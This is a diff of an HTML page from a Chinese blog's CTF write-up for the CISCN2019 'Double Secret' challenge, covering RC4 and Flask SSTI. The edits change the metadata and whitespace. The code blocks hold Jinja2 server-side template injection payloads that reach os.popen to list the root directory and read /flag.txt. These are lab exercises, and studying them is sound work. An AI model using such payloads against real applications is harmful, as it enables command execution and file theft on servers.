@@ -509,14 +509,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-20
+                    2021-08-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    266
+                    254
                 </div>
                 
 
@@ -546,7 +546,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="刷题笔记-CISCN2019-华东南赛区-Double-Secret"><a href="#刷题笔记-CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="刷题笔记:[CISCN2019 华东南赛区]Double Secret"></a>刷题笔记:[CISCN2019 华东南赛区]Double Secret</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[rc4|ssti|flask]</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[rc4|ssti|flask]</p>
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211302124.png" alt="image-20210720211302124"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>就是靠灵光一闪</p>
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211632653.png" alt="image-20210720211632653"></p>
@@ -563,12 +563,12 @@
 <p>蛮怪的，明明是加密，注释又写个解密。</p>
 <p>那大概就是检测加密字符输出解密，检测未加密字符输出加密。</p>
 <p>查文件</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;&#39;).read()&#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>flag在flag.txt里</p>
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720221827489.png" alt="image-20210720221827489"></p>
 <p>于是读/flag.txt</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;flag.txt&#39;).read()&#125;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;flag.txt&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
